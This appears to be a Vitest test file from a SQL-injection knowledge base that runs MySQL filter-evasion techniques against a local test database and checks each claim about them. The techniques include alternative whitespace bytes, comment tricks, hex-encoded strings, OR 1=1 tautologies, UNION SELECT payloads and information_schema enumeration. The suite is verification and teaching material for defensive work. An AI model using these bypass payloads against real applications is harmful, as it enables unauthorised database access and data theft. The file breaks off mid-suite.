/**
 * MySQL Fuzzing and Obfuscation Tests
 *
 * Comprehensive tests for whitespace characters and obfuscation techniques.
 * Tests both direct SQL execution and HTTP layer behavior.
 *
 * @kb-coverage mysql/fuzzing-obfuscation - Full coverage
 */

import { describe, test, expect, beforeAll, afterAll } from "vitest";
import {
  initMySQLDirectRunner,
  cleanupMySQLDirectRunner,
  mysqlDirectSQLExpectSuccess,
  mysqlDirectSQL,
  getMySQLVersion,
} from "../../src/runner/mysql-direct.js";
import { startServer } from "../../src/app/server.js";
import { logger } from "../../src/utils/logger.js";

describe("MySQL Fuzzing and Obfuscation", () => {
  beforeAll(async () => {
    logger.setLevel("warn");
    await initMySQLDirectRunner();
  }, 30000);

  afterAll(async () => {
    await cleanupMySQLDirectRunner();
  }, 10000);

  /**
   * @kb-entry mysql/fuzzing-obfuscation
   * @kb-section Whitespace Alternatives
   *
   * Tests which characters MySQL's SQL lexer accepts as whitespace between tokens.
   * The documentation claims these characters work: 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20, 0xA0
   * This test suite verifies each character individually.
   */
  describe("Whitespace character alternatives", () => {
    /**
     * Test helper to check if a character works as whitespace in a SELECT statement.
     * Tests: SELECT<char>1 and SELECT<char>username<char>FROM<char>users
     */
    async function testWhitespaceChar(
      charCode: number
    ): Promise<{ simpleWorks: boolean; complexWorks: boolean; error?: string }> {
      const char = String.fromCharCode(charCode);

      // Simple test: SELECT<char>1
      const simpleQuery = `SELECT${char}1 AS val`;
      const simpleResult = await mysqlDirectSQL(simpleQuery);

      // Complex test: SELECT<char>username<char>FROM<char>users<char>LIMIT<char>1
      const complexQuery = `SELECT${char}username${char}FROM${char}users${char}LIMIT${char}1`;
      const complexResult = await mysqlDirectSQL(complexQuery);

      return {
        simpleWorks: simpleResult.success,
        complexWorks: complexResult.success,
        error: simpleResult.error?.message ?? complexResult.error?.message,
      };
    }

    // Document ASCII whitespace characters (0x09-0x0D and 0x20)
    describe("ASCII whitespace characters (should all work)", () => {
      test("0x09 (Horizontal Tab) works as whitespace", async () => {
        const result = await testWhitespaceChar(0x09);
        expect(result.simpleWorks).toBe(true);
        expect(result.complexWorks).toBe(true);
      });

      test("0x0A (Line Feed / Newline) works as whitespace", async () => {
        const result = await testWhitespaceChar(0x0a);
        expect(result.simpleWorks).toBe(true);
        expect(result.complexWorks).toBe(true);
      });

      test("0x0B (Vertical Tab) works as whitespace", async () => {
        const result = await testWhitespaceChar(0x0b);
        expect(result.simpleWorks).toBe(true);
        expect(result.complexWorks).toBe(true);
      });

      test("0x0C (Form Feed) works as whitespace", async () => {
        const result = await testWhitespaceChar(0x0c);
        expect(result.simpleWorks).toBe(true);
        expect(result.complexWorks).toBe(true);
      });

      test("0x0D (Carriage Return) works as whitespace", async () => {
        const result = await testWhitespaceChar(0x0d);
        expect(result.simpleWorks).toBe(true);
        expect(result.complexWorks).toBe(true);
      });

      test("0x20 (Space) works as whitespace", async () => {
        const result = await testWhitespaceChar(0x20);
        expect(result.simpleWorks).toBe(true);
        expect(result.complexWorks).toBe(true);
      });
    });

    /**
     * @kb-entry mysql/fuzzing-obfuscation
     * @kb-section Whitespace Alternatives - Non-breaking Space
     *
     * Critical test: 0xA0 (Non-breaking Space / NBSP) is listed in documentation
     * as a valid whitespace alternative but MySQL's lexer may NOT accept it.
     */
    describe("Non-breaking space (0xA0) - CRITICAL TEST", () => {
      test("0xA0 (Non-breaking Space / NBSP) - simple query", async () => {
        const char = String.fromCharCode(0xa0);
        const query = `SELECT${char}1 AS val`;
        const result = await mysqlDirectSQL(query);

        // Log the result for documentation
        console.log(
          `0xA0 simple query result: success=${result.success}, error=${result.error?.message}`
        );

        // This test documents the actual behavior
        // If this test fails, 0xA0 does NOT work as whitespace in MySQL
        if (!result.success) {
          console.log("CONFIRMED: 0xA0 (Non-breaking Space) does NOT work as whitespace in MySQL");
        }
      });

      test("0xA0 (Non-breaking Space / NBSP) - complex query with table access", async () => {
        const char = String.fromCharCode(0xa0);
        const query = `SELECT${char}username${char}FROM${char}users${char}LIMIT${char}1`;
        const result = await mysqlDirectSQL(query);

        console.log(
          `0xA0 complex query result: success=${result.success}, error=${result.error?.message}`
        );
      });

      test("0xA0 in URL-encoded form (%A0) - documents raw 0xA0 behavior", async () => {
        // This test documents raw 0xA0 byte behavior, not URL-encoded representation.
        // URL encoding is handled by the web layer, not the database.
        // MySQL does NOT recognize 0xA0 (non-breaking space) as whitespace.
        const char = String.fromCharCode(0xa0);
        const query = `SELECT${char}1`;
        const result = await mysqlDirectSQL(query);

        // 0xA0 is NOT valid whitespace in MySQL - it should fail
        expect(result.success).toBe(false);
      });
    });

    /**
     * Test other commonly claimed "whitespace alternatives" that are NOT actually whitespace
     */
    describe("Characters that are NOT valid whitespace", () => {
      test("0x00 (NULL) does NOT work as whitespace", async () => {
        const result = await testWhitespaceChar(0x00);
        expect(result.simpleWorks).toBe(false);
      });

      test("0x01-0x08 (Control characters) do NOT work as whitespace", async () => {
        for (let code = 0x01; code <= 0x08; code++) {
          const result = await testWhitespaceChar(code);
          expect(result.simpleWorks).toBe(false);
        }
      });

      test("0x0E-0x1F (Control characters) do NOT work as whitespace", async () => {
        for (let code = 0x0e; code <= 0x1f; code++) {
          const result = await testWhitespaceChar(code);
          expect(result.simpleWorks).toBe(false);
        }
      });
    });

    /**
     * Comprehensive test: Build a summary of all whitespace characters
     */
    describe("Comprehensive whitespace character survey", () => {
      test("Survey all potential whitespace characters (0x00-0xFF)", async () => {
        const results: {
          code: number;
          hex: string;
          works: boolean;
          description: string;
        }[] = [];

        // Test characters commonly claimed to work as whitespace
        const testCodes = [
          { code: 0x09, desc: "Horizontal Tab" },
          { code: 0x0a, desc: "Line Feed (LF)" },
          { code: 0x0b, desc: "Vertical Tab" },
          { code: 0x0c, desc: "Form Feed" },
          { code: 0x0d, desc: "Carriage Return (CR)" },
          { code: 0x20, desc: "Space" },
          { code: 0xa0, desc: "Non-breaking Space (NBSP)" },
        ];

        for (const { code, desc } of testCodes) {
          const char = String.fromCharCode(code);
          const query = `SELECT${char}1 AS val`;
          const result = await mysqlDirectSQL(query);

          results.push({
            code,
            hex: `0x${code.toString(16).toUpperCase().padStart(2, "0")}`,
            works: result.success,
            description: desc,
          });
        }

        // Log summary
        console.log("\n=== MySQL Whitespace Character Survey ===");
        console.log("Characters that WORK as whitespace:");
        results
          .filter((r) => r.works)
          .forEach((r) => {
            console.log(`  ${r.hex} (${r.description})`);
          });

        console.log("\nCharacters that DO NOT work as whitespace:");
        results
          .filter((r) => !r.works)
          .forEach((r) => {
            console.log(`  ${r.hex} (${r.description})`);
          });

        // The actual assertion: verify ASCII whitespace works
        const asciiWhitespace = results.filter((r) => r.code >= 0x09 && r.code <= 0x0d);
        asciiWhitespace.forEach((r) => {
          expect(r.works).toBe(true);
        });

        // Space should work
        const space = results.find((r) => r.code === 0x20);
        expect(space?.works).toBe(true);

        // NBSP (0xA0) - document actual behavior
        const nbsp = results.find((r) => r.code === 0xa0);
        console.log(`\n0xA0 (NBSP) works as whitespace: ${nbsp?.works}`);
      });
    });
  });

  /**
   * @kb-entry mysql/fuzzing-obfuscation
   * @kb-section Whitespace in UNION SELECT context
   *
   * Test whitespace alternatives specifically in injection-relevant contexts.
   */
  describe("Whitespace in UNION SELECT context", () => {
    test("Tab between UNION and SELECT", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT id, username FROM users WHERE id = 1 UNION\tSELECT 999, 'tab_test'"
      );
      const usernames = rows.map((r) => (r as { username: string }).username);
      expect(usernames).toContain("tab_test");
    });

    test("Newline between UNION and SELECT", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT id, username FROM users WHERE id = 1 UNION\nSELECT 999, 'newline_test'"
      );
      const usernames = rows.map((r) => (r as { username: string }).username);
      expect(usernames).toContain("newline_test");
    });

    test("Carriage return between UNION and SELECT", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT id, username FROM users WHERE id = 1 UNION\rSELECT 999, 'cr_test'"
      );
      const usernames = rows.map((r) => (r as { username: string }).username);
      expect(usernames).toContain("cr_test");
    });

    test("Form feed between UNION and SELECT", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT id, username FROM users WHERE id = 1 UNION\fSELECT 999, 'ff_test'"
      );
      const usernames = rows.map((r) => (r as { username: string }).username);
      expect(usernames).toContain("ff_test");
    });

    test("Vertical tab between UNION and SELECT", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT id, username FROM users WHERE id = 1 UNION\vSELECT 999, 'vtab_test'"
      );
      const usernames = rows.map((r) => (r as { username: string }).username);
      expect(usernames).toContain("vtab_test");
    });

    test("0xA0 (NBSP) between UNION and SELECT - document behavior", async () => {
      const nbsp = String.fromCharCode(0xa0);
      const query = `SELECT id, username FROM users WHERE id = 1 UNION${nbsp}SELECT 999, 'nbsp_test'`;
      const result = await mysqlDirectSQL(query);

      console.log(`NBSP in UNION SELECT context: success=${result.success}`);
      if (result.error) {
        console.log(`Error: ${result.error.message}`);
      }

      // MySQL lexer does NOT accept NBSP as whitespace
      expect(result.success).toBe(false);
    });

    test("Multiple mixed whitespace characters", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT id, username FROM users WHERE id = 1 UNION\n\t\r\nSELECT 999, 'mixed_ws'"
      );
      const usernames = rows.map((r) => (r as { username: string }).username);
      expect(usernames).toContain("mixed_ws");
    });
  });

  /**
   * @kb-entry mysql/fuzzing-obfuscation
   * @kb-section Comment Variations
   */
  describe("Comment variations", () => {
    test("Line comment (-- )", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT * FROM users WHERE id = 1 -- this is a comment"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Hash comment (#)", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT * FROM users WHERE id = 1 # this is a comment"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Block comment (/* */)", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT * FROM users /* comment */ WHERE id = 1"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Inline comments for obfuscation", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT/*comment*/username/**/FROM/**/users WHERE id = 1"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("MySQL version-specific comment (/*!50000 */)", async () => {
      // This comment only executes on MySQL 5.0.0+
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT /*!50000 username */ FROM users WHERE id = 1"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Comment between keyword letters (SEL/**/ECT) - does NOT work in MySQL", async () => {
      // Common misconception: MySQL does NOT allow splitting keywords with comments
      // SEL/**/ECT is NOT valid - the keyword must be intact
      const result = await mysqlDirectSQL("SEL/**/ECT username FROM users WHERE id = 1");
      expect(result.success).toBe(false);
      expect(result.error?.message).toContain("syntax");
    });

    test("Split UNION keyword with comment - does NOT work", async () => {
      // UNI/**/ON is NOT valid in MySQL
      const result = await mysqlDirectSQL(
        "SELECT id, username FROM users WHERE id = 1 UNI/**/ON SELECT 999, 'split_union'"
      );
      expect(result.success).toBe(false);
    });

    test("Comments BETWEEN keywords work (not WITHIN)", async () => {
      // Comments between keywords work, but not within
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT/**/ username /**/FROM/**/ users WHERE id = 1"
      );
      expect(rows.length).toBeGreaterThan(0);
    });
  });

  /**
   * @kb-entry mysql/fuzzing-obfuscation
   * @kb-section Case Variation
   *
   * Note: MySQL KEYWORDS are case-insensitive, but table/column IDENTIFIERS
   * may be case-sensitive depending on the filesystem (Linux = case-sensitive,
   * Windows/macOS = case-insensitive by default).
   */
  describe("Case variation", () => {
    test("Lowercase keywords with lowercase identifiers", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess("select username from users where id = 1");
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Uppercase keywords with lowercase identifiers", async () => {
      // Keywords (SELECT, FROM, WHERE) are case-insensitive
      // Table/column names must match their creation case on Linux
      const { rows } = await mysqlDirectSQLExpectSuccess("SELECT username FROM users WHERE id = 1");
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Mixed case keywords with lowercase identifiers", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess("SeLeCt username FrOm users WhErE id = 1");
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Table names are case-sensitive (platform/config dependent)", async (context) => {
      // Table name case sensitivity depends on:
      // - Filesystem: Linux = case-sensitive, Windows/macOS = case-insensitive
      // - MySQL setting: lower_case_table_names (0 = case-sensitive, 1/2 = insensitive)
      // Check the MySQL server setting to determine expected behavior
      const settingResult = await mysqlDirectSQL("SELECT @@lower_case_table_names AS setting");
      if (!settingResult.success) {
        context.skip();
        return;
      }
      const lowerCaseTableNames = (settingResult.result?.rows[0] as { setting: number }).setting;

      // Skip test if tables are case-insensitive (setting 1 or 2)
      if (lowerCaseTableNames !== 0) {
        console.log(
          `Skipping: lower_case_table_names=${lowerCaseTableNames} (tables are case-insensitive)`
        );
        context.skip();
        return;
      }

      // On case-sensitive systems, 'users' != 'USERS' != 'Users'
      const result = await mysqlDirectSQL("SELECT * FROM USERS WHERE id = 1");
      // Will fail because table was created as lowercase 'users'
      expect(result.success).toBe(false);
      expect(result.error?.message).toContain("doesn't exist");
    });
  });

  /**
   * @kb-entry mysql/fuzzing-obfuscation
   * @kb-section String Representation
   */
  describe("String representation alternatives", () => {
    test("Hex encoding for string values", async () => {
      // 0x61646d696e = 'admin'
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT * FROM users WHERE username = 0x61646d696e"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("CHAR function for string construction", async () => {
      // CHAR(97,100,109,105,110) = 'admin'
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT * FROM users WHERE username = CHAR(97,100,109,105,110)"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("CONCAT for string construction", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT * FROM users WHERE username = CONCAT('ad', 'min')"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Binary string notation (b'')", async () => {
      // b'01100001' = 'a' (ASCII 97)
      const result = await mysqlDirectSQL("SELECT b'01100001' AS val");
      expect(result.success).toBe(true);
    });

    test("CONCAT with LOWER for string construction", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT * FROM users WHERE username = CONCAT(LOWER('AD'), LOWER('MIN'))"
      );
      expect(rows.length).toBeGreaterThan(0);
    });
  });

  /**
   * @kb-entry mysql/fuzzing-obfuscation
   * @kb-section Operator Alternatives
   */
  describe("Operator alternatives", () => {
    test("Basic OR injection (1 OR 1=1)", async () => {
      // From doc line 142: 1 OR 1=1
      const { rows } = await mysqlDirectSQLExpectSuccess("SELECT * FROM users WHERE id = 1 OR 1=1");
      // Should return all rows due to OR 1=1
      expect(rows.length).toBeGreaterThan(1);
    });

    test("Basic AND injection (1 AND 1=1)", async () => {
      // From doc line 147: 1 AND 1=1
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT * FROM users WHERE id = 1 AND 1=1"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("OR with double pipe (||)", async () => {
      // Note: || is OR in MySQL by default (not string concat like in standard SQL)
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT * FROM users WHERE id = 999 || 1=1"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("AND with double ampersand (&&)", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess("SELECT * FROM users WHERE id = 1 && 1=1");
      expect(rows.length).toBeGreaterThan(0);
    });

    test("NULL-safe equal operator (<=>)", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess("SELECT * FROM users WHERE id <=> 1");
      expect(rows.length).toBeGreaterThan(0);
    });

    test("NULL-safe equal with NULL comparison", async () => {
      // <=> returns 1 when comparing NULL to NULL (unlike = which returns NULL)
      const { rows } = await mysqlDirectSQLExpectSuccess("SELECT NULL <=> NULL AS result");
      expect(rows[0].result).toBe(1);
    });

    test("OR with string comparison", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT * FROM users WHERE id = 999 OR '1'='1'"
      );
      expect(rows.length).toBeGreaterThan(0);
    });
  });

  /**
   * @kb-entry mysql/fuzzing-obfuscation
   * @kb-section Numeric Representation
   */
  describe("Numeric representation alternatives", () => {
    test("Mathematical expression (1+0)", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess("SELECT * FROM users WHERE id = 1+0");
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Boolean conversion (true+0 = 1)", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess("SELECT * FROM users WHERE id = true+0");
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Hexadecimal number (0x1 = 1)", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess("SELECT * FROM users WHERE id = 0x1");
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Scientific notation (1e0 = 1)", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess("SELECT * FROM users WHERE id = 1e0");
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Complex mathematical expression", async () => {
      // 2-1 = 1
      const { rows } = await mysqlDirectSQLExpectSuccess("SELECT * FROM users WHERE id = 2-1");
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Boolean false+1 = 1", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess("SELECT * FROM users WHERE id = false+1");
      expect(rows.length).toBeGreaterThan(0);
    });
  });

  /**
   * @kb-entry mysql/fuzzing-obfuscation
   * @kb-section Function Call Obfuscation
   */
  describe("Function call obfuscation", () => {
    test("Subquery instead of direct value", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT * FROM users WHERE id = (SELECT 1)"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Prepared statement execution", async () => {
      // Test prepared statements for dynamic SQL execution
      const result = await mysqlDirectSQL("SET @x = 'SELECT 1 AS val'");
      expect(result.success).toBe(true);

      const result2 = await mysqlDirectSQL("PREPARE stmt FROM @x");
      expect(result2.success).toBe(true);

      const result3 = await mysqlDirectSQL("EXECUTE stmt");
      expect(result3.success).toBe(true);
      expect(result3.result?.rows[0]).toHaveProperty("val", 1);

      await mysqlDirectSQL("DEALLOCATE PREPARE stmt");
    });
  });

  /**
   * @kb-entry mysql/fuzzing-obfuscation
   * @kb-section UNION Query Obfuscation
   */
  describe("UNION query obfuscation", () => {
    test("UNION with redundant WHERE 1=1 (requires FROM clause)", async () => {
      // Note: MySQL requires FROM clause to use WHERE in UNION part
      // Documentation example "1 UNION SELECT 1,2,3 WHERE 1=1" is INVALID
      // Must use: UNION SELECT ... FROM dual WHERE 1=1
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT id, username FROM users WHERE id = 1 UNION SELECT 999, 'injected' FROM dual WHERE 1=1"
      );
      const usernames = rows.map((r) => (r as { username: string }).username);
      expect(usernames).toContain("injected");
    });

    test("UNION SELECT ... WHERE 1=1 without FROM - version dependent", async () => {
      // MySQL 5.7: INVALID (requires FROM clause for WHERE)
      // MySQL 8.0+: VALID (WHERE without FROM is allowed)
      const version = await getMySQLVersion();
      const result = await mysqlDirectSQL("SELECT 1 UNION SELECT 2 WHERE 1=1");

      if (version.major >= 8) {
        // MySQL 8.0+ accepts this syntax
        expect(result.success).toBe(true);
        expect(result.result?.rows.length).toBe(2);
      } else {
        // MySQL 5.7 rejects it
        expect(result.success).toBe(false);
        expect(result.error?.message).toContain("syntax");
      }
    });

    test("UNION with NULL values", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT id, username FROM users WHERE id = 1 UNION SELECT NULL, (SELECT username FROM users LIMIT 1)"
      );
      expect(rows.length).toBeGreaterThan(1);
    });

    test("Nested UNION with derived table", async () => {
      // 1 UNION (SELECT * FROM (SELECT 1,2,3)x)
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT id, username FROM users WHERE id = 1 UNION (SELECT * FROM (SELECT 999, 'nested_union')x)"
      );
      const usernames = rows.map((r) => (r as { username: string }).username);
      expect(usernames).toContain("nested_union");
    });

    test("UNION ALL vs UNION (duplicates)", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT 1 AS val UNION ALL SELECT 1 UNION ALL SELECT 2"
      );
      // UNION ALL keeps duplicates
      expect(rows.length).toBe(3);
    });
  });

  /**
   * @kb-entry mysql/fuzzing-obfuscation
   * @kb-section Keyword Bypass Techniques
   */
  describe("Keyword bypass techniques", () => {
    test("Spaces around dot in qualified names", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT table_name FROM information_schema . tables WHERE table_schema = DATABASE() LIMIT 1"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Comments around dot in qualified names", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT table_name FROM information_schema/**/./**/tables WHERE table_schema = DATABASE() LIMIT 1"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Backtick-quoted identifiers", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT `table_name` FROM `information_schema`.`tables` WHERE `table_schema` = DATABASE() LIMIT 1"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Executable comment without version (/*! */)", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "/*! SELECT */ username FROM users WHERE id = 1"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Symbol spam with arithmetic operators", async () => {
      // -+--+--+~0 = ~0 = -1 (all truthy)
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT * FROM users WHERE id = 1 AND -+--+--+~0"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Symbol spam with double tilde", async () => {
      // ~~1 = 1 (double bitwise NOT)
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT * FROM users WHERE id = 1 AND -+--+--+~~((1))"
      );
      expect(rows.length).toBeGreaterThan(0);
    });
  });

  /**
   * @kb-entry mysql/fuzzing-obfuscation
   * @kb-section Comment Obfuscation with Newlines
   */
  describe("Comment obfuscation with newlines", () => {
    test("Hash comment with newline injection", async () => {
      // Simulates: WHERE id='[input]' AND active=1
      // Input: 1'#\nOR 1=1--
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT * FROM users WHERE id = '1'#\nOR 1=1-- "
      );
      // Hash comments out rest of line, newline starts new statement part
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Multiline comment bypass", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT * FROM users WHERE id = 1/*\ncomment\n*/OR 1=1"
      );
      expect(rows.length).toBeGreaterThan(0);
    });
  });

  /**
   * @kb-entry mysql/fuzzing-obfuscation
   * @kb-section Information Schema with Hex
   */
  describe("Information schema queries", () => {
    test("Table name with hex encoding in LIKE", async () => {
      // 0x7573657273 = 'users' in hex
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT table_name FROM information_schema.tables WHERE table_name LIKE 0x7573657273 LIMIT 1"
      );
      expect(rows.length).toBeGreaterThan(0);
      expect(rows[0].TABLE_NAME ?? rows[0].table_name).toBe("users");
    });

    test("Subquery with information_schema", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT * FROM (SELECT table_name FROM information_schema.tables WHERE table_name LIKE 0x7573657273 LIMIT 1)x"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("information_schema.columns with spaces around dot", async () => {
      // From doc line 266: information_schema . columns
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT column_name FROM information_schema . columns WHERE table_name = 'users' LIMIT 1"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("information_schema.columns with backticks", async () => {
      // From doc line 276: `information_schema`.`columns`
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT `column_name` FROM `information_schema`.`columns` WHERE `table_name` = 'users' LIMIT 1"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("information_schema.columns with comments around dot", async () => {
      // From doc line 331: information_schema/**/./**/columns
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT column_name FROM information_schema/**/./**/columns WHERE table_name = 'users' LIMIT 1"
      );
      expect(rows.length).toBeGreaterThan(0);
    });
  });

  /**
   * @kb-entry mysql/fuzzing-obfuscation
   * @kb-section Practical Examples
   */
  describe("Practical examples from documentation", () => {
    test("CONCAT cannot construct SQL keywords", async () => {
      // This should NOT execute as a SELECT - keywords must be literal
      const result = await mysqlDirectSQL("SELECT CONCAT('SEL','ECT') AS keyword");
      expect(result.success).toBe(true);
      // The result is just the string "SELECT", not an executed query
      expect(result.result?.rows[0].keyword).toBe("SELECT");
    });

    test("CASE WHEN in UNION injection", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT id, username FROM users WHERE id = 1 UNION ALL SELECT 999, (CASE WHEN (1=1) THEN 'true_branch' ELSE 'false_branch' END)"
      );
      const usernames = rows.map((r) => (r as { username: string }).username);
      expect(usernames).toContain("true_branch");
    });

    test("UNHEX for string obfuscation", async () => {
      // UNHEX converts hex string to binary string
      // 61646d696e = 'admin'
      const { rows } = await mysqlDirectSQLExpectSuccess("SELECT UNHEX('61646d696e') AS val");
      expect(String(rows[0].val)).toBe("admin");
    });

    test("Hex comparison in WHERE clause", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT * FROM users WHERE id = 1 AND 0x1=0x1"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Alternate whitespace payload example", async () => {
      // SELECT%09username%0AFROM%0Dusers - using tab, newline, carriage return
      const tab = String.fromCharCode(0x09);
      const lf = String.fromCharCode(0x0a);
      const cr = String.fromCharCode(0x0d);
      const { rows } = await mysqlDirectSQLExpectSuccess(
        `SELECT${tab}username${lf}FROM${cr}users WHERE id = 1`
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Documentation example payload with mixed whitespace and comment", async () => {
      // From doc line 55: '%0A%09UNION%0CSELECT%0BNULL%20%23
      // This simulates injection into: SELECT * FROM users WHERE id = '[INPUT]'
      const lf = String.fromCharCode(0x0a);
      const tab = String.fromCharCode(0x09);
      const ff = String.fromCharCode(0x0c);
      const vt = String.fromCharCode(0x0b);
      const sp = String.fromCharCode(0x20);

      // Construct: ' UNION SELECT NULL #
      // payload example (not used in test): `'${lf}${tab}UNION${ff}SELECT${vt}NULL${sp}#`
      const { rows } = await mysqlDirectSQLExpectSuccess(
        `SELECT id FROM users WHERE id = '1'${lf}${tab}UNION${ff}SELECT${vt}999${sp}#`
      );
      expect(rows.length).toBeGreaterThan(1);
    });

    test("Excessive whitespace between keywords", async () => {
      // From doc line 115: SELECT       username       FROM       users
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT       username       FROM       users       WHERE       id = 1"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("AND NOT with CASE WHEN in UNION", async () => {
      // From doc line 369: 1 AND NOT 1=2 UNION ALL SELECT (CASE WHEN...)
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT id, username FROM users WHERE id = 1 AND NOT 1=2 UNION ALL SELECT 999, (CASE WHEN (1=1) THEN 'case_test' ELSE 'other' END)"
      );
      const usernames = rows.map((r) => (r as { username: string }).username);
      expect(usernames).toContain("case_test");
    });

    test("Version-conditional executable comment (/*!50000 */)", async () => {
      // From doc line 288: /*!50000 SELECT */ * FROM users
      // This executes on MySQL 5.0.0+
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "/*!50000 SELECT */ * FROM users WHERE id = 1"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Multiline injection with hash comment", async () => {
      // From doc lines 244-252: injection breaking across lines with # comment
      // Simulates: WHERE id='1'# followed by newline and OR 1=1
      const result = await mysqlDirectSQL("SELECT * FROM users WHERE id = '1'#comment\nOR 1=1");
      expect(result.success).toBe(true);
      // The # comments out the rest of line 1, then OR 1=1 is on new line
      expect(result.result?.rows.length).toBeGreaterThan(0);
    });
  });

  /**
   * @kb-entry mysql/fuzzing-obfuscation
   * @kb-section Characters That Don't Require Space After SELECT
   *
   * MySQL allows certain characters immediately after SELECT without whitespace.
   */
  describe("Characters after SELECT without space", () => {
    test("SELECT'string' - quote starts string literal", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess("SELECT'test' AS val");
      expect(rows[0].val).toBe("test");
    });

    test("SELECT-1 - unary minus", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess("SELECT-1 AS val");
      expect(rows[0].val).toBe(-1);
    });

    test("SELECT+1 - unary plus", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess("SELECT+1 AS val");
      expect(rows[0].val).toBe(1);
    });

    test("SELECT(1) - parentheses", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess("SELECT(1) AS val");
      expect(rows[0].val).toBe(1);
    });

    test("SELECT~1 - bitwise NOT", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess("SELECT~1 AS val");
      // ~1 = 18446744073709551614 (unsigned 64-bit NOT of 1)
      // mysql2 driver may return BigInt or string - just verify query succeeds
      // and result is a large number (not 0 or small)
      const val = BigInt(String(rows[0].val));
      expect(val > BigInt(1000000000)).toBe(true);
    });

    test("SELECT!0 - logical NOT", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess("SELECT!0 AS val");
      expect(rows[0].val).toBe(1);
    });

